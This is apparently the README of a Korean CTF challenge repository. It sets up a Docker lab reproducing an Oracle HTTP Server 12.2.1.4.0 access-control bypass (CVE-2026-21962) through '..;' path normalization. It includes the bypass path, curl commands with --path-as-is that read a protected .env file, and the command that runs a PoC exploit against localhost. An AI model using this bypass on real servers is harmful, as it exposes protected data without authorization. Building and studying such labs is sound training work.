# CVE-2026-21962 — OHS Access-Control Bypass CTF Challenge

> 윈스테크넷 9기 CTF 3차 — 도커 환경 구축 / 배정 포트 **10008**
> 대상: Oracle HTTP Server **12.2.1.4.0** (+ mod_wl_ohs 프록시 플러그인)

## 취약점 한 줄 요약
OHS(프론트)와 백엔드가 `..;` 를 다르게 정규화해서, `<Location /internal-admin>` 차단을
우회(`/foo/..;/internal-admin/cont/.env`)해 보호 리소스에 접근하는
**접근제어 우회(CWE-284, CVSS 10.0)**.

## 구조 (컨테이너 2개)
```
[솔버] → :10008 → [ohs-front : 실제 취약 OHS 12.2.1.4.0]
                        │ (mod_wl_ohs, /foo → 프록시)
                        ▼ :7101 (내부)
                  [backend : 가벼운 모의 WebLogic]
                   └ /internal-admin/cont/.env 에 FLAG + X-ORACLE-DMS 헤더
```
- 바깥에 열리는 포트는 **10008 하나뿐** (backend 는 내부 전용)
- 컨테이너당 256m → 메모리 규칙 충족

## 폴더 구조
```
cve-2026-21962/
├── docker-compose.yml        # 2-서비스 (ohs-front + backend)
├── README.md / WRITEUP.md
├── .gitignore / .gitattributes
├── ohs/                      # 프론트 OHS (실제 취약 버전)
│   ├── Dockerfile            # OHS 12.2.1.4 사일런트 설치
│   ├── httpd.conf            # OHS 구동 + 취약 트리거(mod_wl_ohs /foo, /internal-admin 차단)
│   ├── entrypoint.sh         # httpd 포그라운드 기동 + 랜딩 페이지
│   └── (설치본 2개 여기 복사: fmw_..._ohs_linux64.bin, jdk-8u202...tar.gz)  ← gitignore
├── backend/                  # 가벼운 모의 백엔드 (파이썬 표준 라이브러리)
│   ├── Dockerfile
│   └── app.py                # /internal-admin/cont/.env 에 FLAG + X-ORACLE-DMS 헤더
└── exploit/
    ├── CVE-2026-21962.py     # 검증된 PoC
    └── README.md
```

## 빌드 전 준비
Oracle 계정으로 받은 설치본 2개를 `ohs/` 에 복사 (`.gitignore`로 커밋 차단됨):
- `fmw_12.2.1.4.0_ohs_linux64.bin`
- `jdk-8u202-linux-x64.tar.gz`

## 빌드 & 실행
실제 플래그는 **환경변수로만 주입** (파일/이미지에 하드코딩 없음 — 규칙3):

```bash
# Windows (CMD)
set FLAG=WINS{실제_플래그}
docker compose up -d --build

# Linux / macOS
FLAG='WINS{실제_플래그}' docker compose up -d --build
```

## 동작 확인 (A/B)
| 요청 | 결과 |
|------|------|
| `GET /` | 200 (안내 페이지) |
| `GET /internal-admin/cont/.env` | **404** (프론트 차단) |
| `GET /foo/..;/internal-admin/cont/.env` | **200 + FLAG 유출** (우회 성공) |

curl 로 바로 확인:
```bash
curl -i "http://localhost:10008/internal-admin/cont/.env"
curl -i --path-as-is "http://localhost:10008/foo/..;/internal-admin/cont/.env"
```
> `--path-as-is` 필수 (없으면 curl 이 `..` 를 먼저 정리해버려 우회가 성립하지 않음)

## 풀이 검증 (규칙8)
```bash
python3 exploit/CVE-2026-21962.py -t http://127.0.0.1:10008 --auto-proxy --check ALL
# => 보호된 .env 의 WINS{...} 가 유출되면 완료
```

## 상태
| 부분 | 상태 |
|------|------|
| OHS 프론트 (실제 취약 12.2.1.4.0) | ✅ 구동 확인 |
| 백엔드 (모의, X-ORACLE-DMS 헤더) | ✅ 완성·테스트 |
| compose / 포트 / 메모리 / 플래그 주입 | ✅ |
| exploit (검증 PoC) | ✅ |

## 제출 전 체크리스트
- [x] 바깥 포트 10008, 백엔드 내부 전용
- [x] 플래그 `WINS{...}`, 환경변수 주입, 실제 플래그/설치본 커밋 안 함
- [x] `privileged`/`docker.sock`/`/:/host` 미사용
- [x] 이미지 태그 고정, 런타임 외부 다운로드 없음
- [x] `docker compose up -d --build` 한 번에 기동
- [x] exploit 으로 플래그 획득 확인
- [ ] 깃허브 레포 URL 시트 작성 + [도커 제작 완료] 체크
